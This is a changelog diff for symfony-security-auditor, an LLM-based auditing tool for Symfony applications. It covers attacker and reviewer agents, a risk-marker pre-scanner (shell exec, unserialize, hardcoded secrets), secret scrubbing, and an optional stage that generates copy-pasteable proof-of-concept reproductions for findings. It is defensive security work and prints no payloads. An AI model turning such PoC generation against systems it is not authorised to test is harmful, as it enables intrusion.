-  `#[IsGranted('ATTR', $subject)]` against the voters that actually accept that
-  attribute on that subject (a `missing_voter` finding when nothing matches),
-  and cross-reference `createForm()` call sites against the form types involved
-  (mass-assignment / CSRF surface).
-
-### Changed
-
-- `AttackerPromptBuilder::PROMPT_VERSION` bumped to **5** and
-  `RegexStaticPreScanner::CACHE_VERSION` bumped to **2** so cached attacker
-  responses invalidate automatically against the new prompt and pattern.
-- `VulnerabilityFactory` now takes a
-  `Symfony\Component\Validator\Validator\ValidatorInterface` as a constructor
-  argument (autowired via a private inline factory in `config/services.php`).
-  The factory is `@internal`, so this is a non-BC change for end users;
-  downstream custom-agent code that constructs the factory manually must pass a
-  `ValidatorInterface` (typically `Validation::createValidator()`).
-- `MappingStage` now takes three optional parser arguments
-  (`ControllerAccessControlParserInterface`, `VoterCapabilityParserInterface`,
-  `FormBindingParserInterface`); each defaults to a no-op parser, preserving the
-  previous shape. The DI wiring binds the real parsers in production.
-- `nikic/php-parser ^5.3` is now a runtime dependency (previously transitive via
-  `phpunit/php-code-coverage`); used by the three AST parsers.
+- Cached attacker answers refresh once after upgrading, because the attacker prompt and the pre-scanner patterns changed ([#28](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/28))
+- `nikic/php-parser` `^5.3` is now a direct dependency ([#28](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/28))
+- Custom agents that build `VulnerabilityFactory` by hand must now pass a `ValidatorInterface` (the class is `@internal`) ([#28](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/28))
 
 ## [1.4.0] — 2026-05-27 — Bloodhound
 
-A detection-and-cost release. The auditor now covers the modern Symfony 7.x/8.x
-attack surface, follows data flow across files, and gives operators several
-opt-in levers to cut token spend. Every addition is backward compatible — new
-configuration keys, new Domain ports, a new `audit:run` option, new
-`VulnerabilityType` cases, and additive JSON/SARIF fields. No existing key,
-default, exit code, or schema field changed meaning.
+### New Features ✨
 
-### Added
+- Cover the modern Symfony 7.x and 8.x attack surface: new detectors and attacker checks for Authenticators, Messenger handlers, Webhook consumers, EventSubscribers, Normalizers and Scheduler tasks, plus `#[MapRequestPayload]`, Twig and Live Components, `html_sanitizer`, mailer header injection, cache poisoning, `RateLimiterFactory` scope confusion and `HttpClient` redirect-host bypass ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Add the finding types `missing_signature_verification`, `messenger_handler_unsafe`, `missing_rate_limiting`, `cache_poisoning`, `mailer_header_injection`, `webhook_replay` and `authenticator_bypass` ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Tag files with about 30 deterministic risk markers (unserialize, shell exec, `|raw`, `csrf_protection: false`, hardcoded secrets, Doctrine string concatenation, …) before the LLM runs, at no token cost; `audit.static_prescan.enabled` (default `true`) switches it and `audit.static_prescan.lean_mode` (default `false`) drops marker-free files to cut token spend ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Add `scan.custom_risk_patterns` to merge project-specific regex markers into the pre-scanner, keyed by file type ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Add `audit.chunking.strategy` (default `feature`), which sends a controller with its entity, repository, form, voter and templates in one chunk so the LLM can follow data flow across files; `type` restores the previous priority-window chunking ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Pass the already validated findings to iterations 2 and later, so the attacker generalizes patterns to uncovered files instead of rediscovering the same bugs ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Add `audit.reviewer_tools_enabled` (default `false`) to give the reviewer the same `read_file`, `grep`, `list_files` and `lookup_advisory` tools as the attacker, capped by `audit.reviewer_max_tool_iterations` ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Add `audit.poc_synthesis.enabled` (default `false`) and `audit.poc_synthesis.severity_floor` (default `high`) to generate a copy-pasteable reproduction (curl, console invocation, payload) for validated findings, exposed in the new `synthesized_poc` report field ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Add `audit.code_slicing.enabled` (default `false`) and `audit.code_slicing.min_lines_before_slicing` (default `80`) to trim large PHP files to their security-relevant lines while keeping line numbers accurate; the new `CodeSlicerInterface` port has `RegexCodeSlicer` and `NullCodeSlicer` implementations ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Add `audit:run --since=<ref>` to audit only the files changed against a git ref, committed or not, for fast pull-request scans ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Add `audit.escalation.enabled` (default `false`) and `audit.escalation.cheap_model`: a cheap model sweeps first and the expensive model only re-analyses the files it flagged, with the cheap findings as context ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Add `audit.reviewer_max_concurrent` (default `1`) to review findings concurrently when the reviewer runs one finding per call with tools off, shortening the reviewer phase ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Cache attacker answers per pre-scanner version and `scan.custom_risk_patterns` hash, so changing custom patterns invalidates stale entries, and keep empty LLM responses as negative-cache entries ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Default file chunking is now `feature`; set `audit.chunking.strategy: type` to restore the previous behaviour ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
 
-- **Symfony 7.x/8.x attack surface.** Six new file-type detectors
-  (Authenticator, Messenger handler, Webhook consumer, EventSubscriber,
-  Normalizer, Scheduler) each get a dedicated attacker skill block hunting
-  modern failure modes: `SelfValidatingPassport` misuse, missing/`==`-based
-  webhook HMAC verification, `php_serialize` Messenger transports,
-  mass-assignment via Serializer denormalizers, lock-less recurring tasks, and
-  Live Components leaking writable props. Existing
-  controller/template/config/php blocks now also cover `#[MapRequestPayload]`,
-  Twig Components/Live Components, `html_sanitizer`, mailer header injection,
-  cache poisoning, `RateLimiterFactory` scope confusion, and `HttpClient`
-  redirect-host bypass. Seven new `VulnerabilityType` cases back this surface:
-  `missing_signature_verification`, `messenger_handler_unsafe`,
-  `missing_rate_limiting`, `cache_poisoning`, `mailer_header_injection`,
-  `webhook_replay`, `authenticator_bypass`.
-- **Static pre-scanner** (`StaticPreScannerInterface` →
-  `RegexStaticPreScanner`). A deterministic, zero-token pass tags files with ~30
-  risk markers (unserialize, shell exec, `|raw`, `csrf_protection: false`,
-  hardcoded secrets, Doctrine string concatenation, …) that are injected into
-  the attacker prompt so the LLM focuses on concrete locations. New keys
-  `audit.static_prescan.enabled` (default `true`) and
-  `audit.static_prescan.lean_mode` (default `false`; drops marker-free files to
-  slash token spend).
-- **Custom risk patterns** (`scan.custom_risk_patterns`). Project-specific regex
-  markers merged into the pre-scanner dictionary, keyed by file-type bucket.
-- **Feature-based chunking** (`audit.chunking.strategy`, default `feature`).
-  Groups a controller with its entity, repository, form, voter, and templates in
-  one chunk so the LLM can follow cross-file data flow. `type` restores the
-  legacy priority-window chunking.
-- **Cross-iteration finding propagation.** Iterations 2+ receive a compact
-  summary of already-validated findings so the attacker generalizes patterns to
-  uncovered files instead of re-discovering the same bugs.
-- **Reviewer tools** (`audit.reviewer_tools_enabled`, default `false`). The
-  reviewer can use the same `read_file`/`grep`/`list_files`/`lookup_advisory`
-  registry as the attacker to verify cross-file mitigations, with its own
-  `audit.reviewer_max_tool_iterations` cap.
-- **PoC synthesis stage** (`audit.poc_synthesis.enabled`, default `false`;
-  `audit.poc_synthesis.severity_floor`, default `high`). Generates a concrete,
-  copy-pasteable reproduction artifact (curl, console invocation, payload) for
-  validated findings at or above the floor, exposed as the additive
-  `synthesized_poc` report field.
-- **Code slicing** (`audit.code_slicing.enabled`, default `false`;
-  `audit.code_slicing.min_lines_before_slicing`, default `80`). Trims large PHP
-  files to security-relevant lines (structure, signatures, token-bearing lines),
-  eliding the rest one-for-one so line numbers stay accurate. New
-  `CodeSlicerInterface` port with `RegexCodeSlicer` / `NullCodeSlicer`.
-- **Diff mode** (`audit:run --since=<ref>`). Audits only files changed against a
-  git ref (committed `ref...HEAD` delta plus uncommitted working-tree changes),
-  for fast pull-request scans. New `GitChangedFilesResolverInterface` port with
-  a `symfony/process`-based adapter.
-- **Cheap→expensive escalation** (`audit.escalation.enabled`, default `false`;
-  `audit.escalation.cheap_model`). A cheap-model sweep runs first; the expensive
-  model only re-analyses files the sweep flagged, with the cheap findings fed in
-  as context.
-- **Concurrent reviewer calls** (`audit.reviewer_max_concurrent`, default `1`).
-  When reviewing one finding per call with tools off, the new opt-in
-  `BatchCapableLLMClientInterface` resolves reviews concurrently (real I/O
-  overlap on async transports, safe sequential fallback otherwise), cutting the
-  reviewer phase wall-clock.
+### Core 🧱
 
-### Changed
-
-- `AttackerPromptBuilder` prompt bumped to version 4 (modern-Symfony skill
-  blocks + expanded type list); the cache-key fold invalidates stale v3
-  payloads.
-- Default file chunking is now `feature` (was an internal priority-window
-  scheme). Set `audit.chunking.strategy: type` to restore the previous
-  behaviour.
-- The attacker cache key now folds in the pre-scanner version and a hash of
-  `scan.custom_risk_patterns`, so changing custom patterns invalidates stale
-  entries. Empty LLM responses are now persisted as negative-cache entries.
-- **File-type vocabulary is now a `ProjectFileType` enum** (Domain). The
-  detector, chunk-priority ordering, pre-scanner pattern buckets, and attacker
-  skill-block ordering all reference the enum instead of duplicated magic
-  strings. `ProjectFile::type()` still returns the string value (no schema
-  change); a new `ProjectFile::fileType()` exposes the typed case.
-- **`symfony/string` and `symfony/filesystem` adopted** across the Application,
-  Infrastructure, and Command layers (string manipulation and filesystem access)
-  per `.claude/rules/php-classes.md`. The Domain layer intentionally stays
-  dependency-free native PHP (documented carve-out). Adds `symfony/string` as a
-  runtime dependency.
-- **`AttackerAgent` slimmed** — `analyze()` takes an immutable
-  `AttackerAnalysisRequest` value object (was five positional parameters), and
-  risk-marker indexing and prompt-context rendering moved to dedicated
-  `RiskMarkerIndex` and `AttackerContextPromptRenderer` collaborators.
-  `AttackerAgentInterface` is `@internal`, so this is not a public API change.
-- **Internal cleanup** — `FileChunker` feature/priority logic split into smaller
-  predicates to cut cyclomatic complexity, and the unused `SEVERITY_FLOOR_*`
-  constants on `PoCSynthesizer` (superseded by the `VulnerabilitySeverity` enum)
-  were removed.
+- Cached attacker answers refresh once after upgrading, because the attacker prompt changed (version 4) ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- Add a `ProjectFileType` enum for the file-type vocabulary; `ProjectFile::type()` still returns the string value and `ProjectFile::fileType()` returns the typed case ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- `symfony/string` is now a runtime dependency, and `symfony/filesystem` and `symfony/string` are used outside the Domain layer ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
+- `AttackerAgent::analyze()` takes an immutable `AttackerAnalysisRequest` instead of five positional parameters (the interface is `@internal`) ([#26](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/26))
 
 ## [1.3.3] — 2026-05-26 — Mesh
 
-### Changed
+### New Features ✨
 
-- `AttackerPromptBuilder` prompt bumped to version 3: the attacker is now
-  explicitly forbidden from emitting bare strings, numbers, booleans, or `null`
-  as JSON array elements, and is told to return `[]` rather than
-  `["no findings"]` or any prose substitute. Audits against vulnerability-free
-  projects previously logged a handful of `warning`-level
-  `Skipping non-array vulnerability entry from LLM` records per run because the
-  model occasionally interleaved prose entries with the expected vulnerability
-  dicts. Bumping the cache-key fold prevents stale v2 payloads — which may
-  already contain stray strings — from being replayed and re-triggering the
-  warning on a cache hit.
-- `VulnerabilityFactory` warning payload now carries an `entry_preview` field —
-  the first 120 bytes of the skipped value when it is a string, `null` otherwise
-  — so operators can see what the model emitted instead of a vulnerability dict
-  without having to enable debug logging.
+- The skipped-entry warning for a malformed model answer now carries an `entry_preview` field (the first 120 bytes of a string, `null` otherwise), so you can see what the model emitted without enabling debug logging ([#25](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/25))
 
-### Fixed
+### Bugfixes 🐛
 
-- `AttackerAgent::analyzeChunk()` now filters non-array entries out of the raw
-  LLM payload before handing it to `AttackerCacheInterface::store()` and re-keys
-  the survivors as a list. Previously, any stray string, number, or `null` from
-  a chatty model was persisted to the filesystem cache as a gapped numeric-keyed
-  array, and the same warning re-fired on every subsequent cache hit. Only the
-  cache write path is affected; `VulnerabilityFactory::fromList()` still
-  receives the full unfiltered payload so the diagnostic warning continues to
-  surface model drift.
+- The attacker is now told never to emit bare strings, numbers, booleans or `null` as array elements and to return `[]` instead of prose, so audits of vulnerability-free projects no longer log `Skipping non-array vulnerability entry from LLM` warnings ([#25](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/25))
+- Stray non-array entries from a chatty model are no longer written to the attacker cache, so the same warning no longer fires again on every cache hit ([#25](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/25))
+
+### Core 🧱
+
+- Cached attacker answers refresh once after upgrading, because the attacker prompt changed (version 3) ([#25](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/25))
 
 ## [1.3.2] — 2026-05-26 — Sieve
 
-### Fixed
+### New Features ✨
 
-- `VulnerabilityFactory::fromList()` now silently drops non-array entries from
-  the decoded LLM payload (with a `warning`-level log carrying the offender's
-  `get_debug_type`). The attacker chunk-analysis path previously assumed
-  `LLMResponse::parseJson()` always returned a list of dicts; when the
-  tool-using loop exhausted its iteration cap or the model emitted a malformed
-  payload, scalar entries (string, int, null) interleaved with the expected
-  vulnerability dicts surfaced as a `TypeError` from `fromArray()` and aborted
-  the entire chunk. The guard now matches the `fromList silently drops nulls`
-  contract documented in `.claude/rules/llm-seam.md`. Phpdoc on `fromArray`
-  relaxed from `array<string, mixed>` to `array<array-key, mixed>` and on
-  `fromList` from `list<array<string, mixed>>` to `list<mixed>` so the static
-  type matches the runtime tolerance.
-- `RegexSecretScrubber::scrub()` no longer redacts Symfony configuration
-  indirections inside otherwise-credentialed assignments. Quoted values matching
-  a Symfony parameter reference (`%env(ANTHROPIC_API_KEY)%`,
-  `%env(string:DB_PASSWORD)%`, `%kernel.secret%`) or a shell-style env expansion
-  (`$NAME`, `${NAME}`) are now passed through unmodified by the
-  `inline_assignment` pattern, while literal secrets and the other pattern
-  families (AWS, GitHub, Stripe, Slack, Google, JWT, PEM, `env_assignment`) keep
-  their existing behavior. Previously, code following the recommended Symfony
-  secrets workflow (`api_key: '%env(ANTHROPIC_API_KEY)%'`) was reported to the
-  LLM as `api_key: '***REDACTED:inline_assignment***'`, which the attacker then
-  escalated to a CRITICAL "hardcoded credential" finding — a false positive on
-  the documented best practice. Implementation switched the `inline_assignment`
-  arm from `preg_replace` to `preg_replace_callback` so the placeholder check
-  can short-circuit per match without affecting the other patterns.
-- `AttackerPromptBuilder::basePrompt()` now carries a "Tool Usage Discipline"
-  section instructing the model that (1) it has a limited, finite tool-call
-  budget per chunk, (2) it must stop using tools and emit the final JSON the
-  moment evidence is sufficient, (3) it must emit `[]` immediately when the
-  initial scan surfaces no findings rather than continuing to call tools "just
-  to be thorough", and (4) any prose, reasoning, or further tool call emitted
-  after the answer-decision causes the response to be discarded as malformed.
-  Real-world audits were exhausting the `max_tool_iterations` budget (default
-  `8`) on Read/Grep/ListFiles/LookupAdvisory calls without ever emitting a final
-  answer, leaving downstream consumers with reasoning prose instead of a
-  vulnerability list. `PROMPT_VERSION` bumped from `1` to `2` so the attacker
-  cache key (which folds in the prompt version) invalidates previously-cached
-  responses produced under the old prompt.
-- `LLMResponse::parseJson()` JSON-block recovery no longer locks on the first
-  `[`/`{` it sees. The new algorithm iterates every opener position outside JSON
-  string literals, attempts `scanBalancedBlockFrom` + `json_decode` at each, and
-  returns the first block that decodes successfully; the original
-  `JsonException` is rethrown only when no candidate block decodes. Recovery is
-  skipped entirely when the trimmed content is itself a single balanced block,
-  preserving the depth-limit semantics of the top-level decode (which already
-  attempted exactly that payload) and preventing silent acceptance of shallower
-  inner sub-blocks inside malformed top-level JSON. Models that wrap their final
-  answer in prose containing PHP-style array access (e.g.
-  `recommendation.contents[locale]`) followed by a trailing `[]` previously had
-  the answer dropped — the first `[` was extracted as `[locale]`, failed to
-  decode, and the recovery never tried the actual JSON tail.
-- `audit:run --dry-run` no longer shows
-  `RISK LEVEL: SAFE / No validated vulnerabilities found / Audit complete` —
-  output that implied a real audit had run and found nothing. Dry-run is a
-  **cost estimate only**: no LLM calls, no vulnerability scan. The new output
-  shows the estimated token counts and cost, followed by
-  `Dry run — no LLM calls were made. This is a cost estimate only.` /
-  `Dry run complete.`. For `--format=json/sarif --output=<file>` the structured
-  report is still written to disk so cost data is machine-readable; the human
-  summary is shown alongside. For `--format=json/sarif` piped to stdout, only
-  the machine-readable output is emitted.
+- `audit:run` shows a live console progress bar over its three stages (Ingestion, Mapping, Audit), hidden for `--format=json|sarif` piped to stdout and for `--dry-run` ([#24](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/24))
 
-### Added
+### Bugfixes 🐛
 
-- `audit:run` now renders a live **console progress bar** while the pipeline
-  runs. Each of the three stages (Ingestion → Mapping → Audit) advances the bar
-  by one step; the stage name appears as the bar message. The bar is suppressed
-  automatically for `--format=json/sarif` piped to stdout and for `--dry-run`.
-  Implemented via a new `ConsoleProgressReporter` (Infrastructure) driven by the
-  existing
-  `pipeline.started / stage.started / stage.completed / pipeline.completed`
-  events that `AuditPipeline` already emits, and wired through a new
-  `ProgressReporterHolder` mutable delegate so the live `SymfonyStyle` output
-  handle can be injected at invocation time without changing
-  `PipelineInterface`.
+- `audit:run --dry-run` no longer prints `RISK LEVEL: SAFE` and `Audit complete`, which implied an audit had run: it shows the estimated tokens and cost followed by `Dry run complete.`; with `--format=json|sarif --output=<file>` the report is still written to disk ([#24](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/24))
+- A stray scalar (string, number or `null`) among the vulnerability entries of a model answer no longer aborts the whole chunk: it is dropped with a `warning` log ([#19](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/19))
+- Secret scrubbing no longer redacts Symfony parameter references (`%env(ANTHROPIC_API_KEY)%`, `%kernel.secret%`) or shell expansions (`$NAME`, `${NAME}`) in credentialed assignments, which the attacker used to report as a critical hardcoded credential; literal secrets are still redacted ([#20](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/20))
+- The attacker is told its tool-call budget per chunk is finite and to answer with the final JSON, or `[]` when the initial scan finds nothing, instead of exhausting `max_tool_iterations` without ever answering ([#22](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/22))
+- When a model wraps its JSON answer in prose that contains brackets such as `recommendation.contents[locale]`, the answer is now recovered by trying every JSON block instead of giving up at the first bracket ([#21](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/21))
 
-### Refactored
+### Core 🧱
 
-- Removed multi-line `//` comment blocks from `src/` and `tests/` that explained
-  what self-evident code does. A new `.claude/rules/no-comments.md` rule
-  codifies the policy: comments signal poorly written code; fix the code
-  instead.
-- Replaced duplicated string literals on four hot paths with `@internal`
-  backed-string enums under `Audit\Domain\Model\`: `ProgressEvent`
-  (`pipeline.started` / `stage.started` / `stage.completed` /
-  `pipeline.completed`) used by `AuditPipeline` and `ConsoleProgressReporter`;
-  `AgentRole` (`attacker` / `reviewer`) used by `AttackerAgent`, `ReviewerAgent`
-  and `EstimateAuditCostUseCase`'s by-role cost breakdown; `BuiltInStageName`
-  (`ingestion` / `mapping` / `audit`) used by the three built-in
-  `StageInterface::name()` returns; and `SecretPatternLabel` (`aws_access_key` /
-  … / `inline_assignment`) used as the key set of
-  `RegexSecretScrubber::DEFAULT_PATTERNS` and its `replacementFor()` match arm.
-  Enum values stay equal to the previously hard-coded strings so every
-  wire-format contract — `ProgressReporterInterface::report()`,
-  `CoverageRecorderInterface::recordCoverage()`, JSON/SARIF `cost.by_role` keys,
-  the `***REDACTED:<label>***` placeholder — is byte-identical; the enums are
-  not exposed on any public port signature.
-
-### Tooling
-
-- Mutation gate now kills the five escaped mutants on the new progress-bar /
-  dry-run path (`ConsoleProgressReporter::onPipelineStarted`,
-  `onStageCompleted`, `onPipelineCompleted` and `AuditCommand`'s
-  `estimatingSection` call + `isMachineReadableToStdout` negation). Added
-  targeted unit tests pinning the `starting…` initial message, the intermediate
-  `1/3` advance frame visible between `stage.completed` and the next
-  `stage.started`, and the `3/3` snap-to-max forced by `finish()`; the E2E suite
-  now wires the shared `ProgressReporterHolder` into both `AuditPipeline` and
-  `AuditCommand` so it can assert the bar renders in `--format=console` and
-  stays suppressed in `--format=json` to stdout, plus the dry-run path now
-  asserts the `Estimating audit cost` section header.
+- Cached attacker answers refresh once after upgrading, because the attacker prompt changed (version 2) ([#22](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/22))
+- Magic strings for progress events, agent roles, built-in stage names and secret-pattern labels are now `@internal` enums; the values on the wire are unchanged ([#24](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/24))
 
 ## [1.3.1] — 2026-05-26 — Watertight
 
-### Tooling
+### Core 🧱
 
-- Mutation gate now kills the `UnwrapTrim` and `ArrayOneItem` mutants escaping
-  the LLM seam (`LLMResponse::parseJson()` markdown-fence stripping path). Added
-  targeted unit tests that pin the trimmed payload around the JSON block and
-  that the recovery path returns the decoded array (not the wrapping list) after
-  stripping fences. No production code change.
+- Test-suite only release: no production code change ([#18](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/18))
 
 ## [1.3.0] — 2026-05-26 — Bonsaï
 
-### Added
+### New Features ✨
 
-- New `scan.included_paths` configuration key (`string[]`, default
-  `['src', 'config', 'templates', 'public/index.php']`) is the **sole scoping
-  knob** for the audit. Only the listed project-relative directories and files
-  are inspected; everything else — `vendor/`, `node_modules/`, `var/`, `tests/`,
-  `migrations/`, `translations/`, `bin/`, root scripts, IDE folders, build
-  artefacts, monorepo siblings — is silently skipped. Symfony Finder is invoked
-  with the resolved directories as its `in()` roots so it never traverses
-  outside the allow-list. If none of the entries resolve in the project root the
-  scanner logs `No included paths exist in project` at `warning` level and
-  returns an empty result.
+- Add `scan.included_paths` (default `['src', 'config', 'templates', 'public/index.php']`), the only setting that scopes the audit: only the listed directories and files are inspected and everything else is skipped; a `No included paths exist in project` warning is logged and nothing is scanned when none exists ([#17](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/17))
 
-### Changed
+### Breaking Changes 💥
 
-- The explicit-file leg of `ProjectFileScanner` now routes through Symfony
-  Finder (`->in(dirname)->depth('== 0')->name(basename)->size('<= NKi')`)
-  instead of a hand-rolled `filesize() > kb * 1024` check, so both legs of the
-  scanner share a single size-comparison implementation.
+- `scan.excluded_dirs` is removed; narrow `scan.included_paths` to the sub-directories you want audited instead ([#17](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/17))
+- The `ProjectFileScanner` constructor parameter `additionalExcludedDirs` and its `HARD_EXCLUDED_DIRS` list are removed, since the scanner no longer walks into `vendor/` or `node_modules/` ([#17](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/17))
 
-### Removed
+### Bugfixes 🐛
 
-- **Breaking:** `scan.excluded_dirs` configuration key. The previous deny-list
-  mechanism (hard defaults plus user-supplied exclusions) has been replaced by
-  `scan.included_paths`. To prune a sub-tree inside an included path (e.g. drop
-  `src/Migrations`), tighten `included_paths` to specific sub-directories:
-
-  ```yaml
-  symfony_security_auditor:
-      scan:
-          included_paths: ['src/Controller', 'src/Form', 'src/Voter']
-  ```
-
-- **Breaking:** the internal `HARD_EXCLUDED_DIRS` list on `ProjectFileScanner`
-  and its `additionalExcludedDirs` constructor parameter are gone. With Finder
-  scanning only included paths, walking into `vendor/` or `node_modules/` no
-  longer happens, so the prune list is unnecessary.
-
-### Fixed
-
-- `scan.max_file_size_kb` now interprets the unit as kibibytes (`1024`-byte
-  blocks) for both directory-scanned and explicitly-listed paths. The previous
-  implementation routed the directory scan through Symfony Finder's `K` suffix
-  (`1000`-byte kilobytes) while the explicit-file path used `*1024`, so files
-  between `1000 * N` and `1024 * N` bytes were treated differently depending on
-  which leg of the scanner saw them. Both paths now share the `Ki` suffix.
-- `LLMResponse::parseJson()` now recovers from conversational prose around a
-  balanced JSON block. With `audit.tools_enabled: true` (the default), the
-  attacker model sometimes ignores the "Return ONLY the JSON array" prompt
-  instruction and wraps its answer in commentary, which previously caused a
-  whole chunk's findings to be dropped with `JsonException: Syntax error`.
-- `AttackerAgent` / `ReviewerAgent` parse-failure error logs now include a
-  512-byte `content_preview` of the LLM response so the actual shape of an
-  unrecoverable payload is diagnosable without re-running the audit.
+- `scan.max_file_size_kb` now means kibibytes (1024 bytes) for both scanned directories and explicitly listed files, which used to disagree for files between `1000 * N` and `1024 * N` bytes ([#17](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/17))
+- A model answer wrapped in conversational prose around a balanced JSON block is now recovered instead of dropping the whole chunk's findings with `JsonException: Syntax error` ([#17](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/17))
+- Attacker and reviewer parse-failure error logs now include a 512-byte `content_preview` of the LLM response ([#17](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/17))
 
 ## [1.2.1] — 2026-05-25 — High Temperature
 
-### Fixed
+### Bugfixes 🐛
 
-- `SymfonyAiLLMClient` now omits the `temperature` option from the platform
-  invocation unless the host has explicitly configured one. Forwarding the
-  default `temperature: 1.0` was rejected by reasoning-only models (notably
-  GPT-5) which require the platform's own default, surfacing as a
-  `temperature does not support` provider error before any chunk could be
-  analyzed. The option is still forwarded verbatim when set, so existing
-  configurations keep their previous behavior.
+- `temperature` is no longer sent to the provider unless you configured one, so reasoning-only models such as GPT-5 no longer fail with a `temperature does not support` error before any chunk is analyzed; a configured value is still forwarded unchanged ([#16](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/16))
 
 ## [1.2.0] — 2026-05-25
 
-### Added
+### New Features ✨
 
-- `audit:run --path=<subdir>` (repeatable, shortcut `-p`) restricts the scan to
-  one or several project-relative subdirectories. The project root remains the
-  argument (or working directory), so advisory lookups still see
-  `composer.lock`. Useful for monorepos where only a single app needs to be
-  audited.
-- `audit:run --no-cache` bypasses the attacker cache for the run: every chunk
-  hits the LLM and no cache entries are written or read. Existing cache stays on
-  disk untouched.
-- New `Audit\Domain\Port\ProgressReporterInterface` plus two ready-to-use
-  implementations (`NullProgressReporter`, `LoggerProgressReporter`). The audit
-  pipeline now emits `pipeline.started`, `stage.started`, `stage.completed`, and
-  `pipeline.completed` events so hosts can render progress without polling.
-  Default is `NullProgressReporter` — silent unless the host wires another
-  implementation.
-- `CharacterBasedTokenEstimator` now covers Mistral / Codestral, Llama
-  (`llama-*`, `llama3*`, `llama4*`, `meta-llama/*`), and DeepSeek model families
-  in addition to Claude / GPT (incl. `o3` / `o4`) / Gemini. The constructor
-  accepts an optional `$charsPerTokenByPrefix` map so hosts can add or override
-  ratios for fine-tuned or self-hosted models without subclassing.
-- `AuditCost` carries an optional per-role breakdown (`byRole()`, also surfaced
-  under `by_role` in `toArray()`). `EstimateAuditCostUseCase` now computes
-  attacker and reviewer cost separately and populates the breakdown, so
-  `audit:run --dry-run` reports show `$X for the attacker model` and
-  `$Y for the reviewer model` instead of a single bundled total. The console
-  template renders the breakdown automatically when present.
-- New `Audit\Domain\Port\RateLimiterInterface` plus two ready-to-use
-  implementations (`NullRateLimiter`, `TokenBucketRateLimiter`). Wrapped around
-  every LLM call, the limiter blocks ahead of time so the audit stays inside the
-  provider's per-minute quota instead of relying on reactive 429 retries. Three
-  independent dimensions track requests-per-minute, input-tokens-per-minute and
-  output-tokens-per-minute; each is independently nullable.
-- New
-  `audit.rate_limit.{requests_per_minute, input_tokens_per_minute, output_tokens_per_minute}`
-  configuration keys (all `int|null`, default `null`). When every dimension is
-  `null` (the default) the bundle wires `NullRateLimiter` and behavior matches
-  the pre-existing retry-only path; setting any dimension wires
-  `TokenBucketRateLimiter` keyed by the configured limits. Recommended starting
-  point for Anthropic Tier 1 is `requests_per_minute: 50`,
-  `input_tokens_per_minute: 500_000`, `output_tokens_per_minute: 80_000` on
-  Opus, scaled down for Haiku/Sonnet.
-- `RetryAfterHeaderParser` reads the server-issued `Retry-After` hint from
-  `Symfony\AI\Platform\Exception\RateLimitExceededException::getRetryAfter()`
-  (or a `retry-after: <int>` substring in the chained messages) and feeds it
-  into `RetryPolicy::rateLimitDelayMs()` plus
-  `RateLimiterInterface::pauseUntil()`. Chunks scheduled after a 429 share the
-  freeze instead of stampeding the provider.
-- `RetryPolicy::rateLimitDelayMs()` now accepts an optional
-  `?int $serverHintSeconds`. When set and positive, the hint wins over the local
-  exponential schedule; the result is clamped to `rateLimitMaxDelayMs` (default
-  `300_000`) so a hostile provider cannot push the wait past a sane ceiling.
-  `null` hints preserve the existing exponential behavior.
-- README now opens with a 30-second quick-start section above the full Getting
-  Started guide.
+- `audit:run --path=<subdir>` (repeatable, shortcut `-p`) restricts the scan to one or several project-relative subdirectories while the project root still provides `composer.lock` for advisory lookups, which suits monorepos where only one app needs auditing ([#15](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/15))
+- `audit:run --no-cache` bypasses the attacker cache for the run: every chunk calls the LLM, and nothing is read from or written to the cache, leaving existing entries on disk untouched ([#15](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/15))
+- `ProgressReporterInterface` lets a host follow a run through `pipeline.started`, `stage.started`, `stage.completed` and `pipeline.completed` events, with the silent `NullProgressReporter` as default and a `LoggerProgressReporter` ready to use ([#15](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/15))
+- Token estimates cover Mistral / Codestral, Llama (`llama-*`, `llama3*`, `llama4*`, `meta-llama/*`) and DeepSeek models, and an optional `$charsPerTokenByPrefix` map on `CharacterBasedTokenEstimator` adds or overrides ratios for fine-tuned or self-hosted models ([#15](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/15))
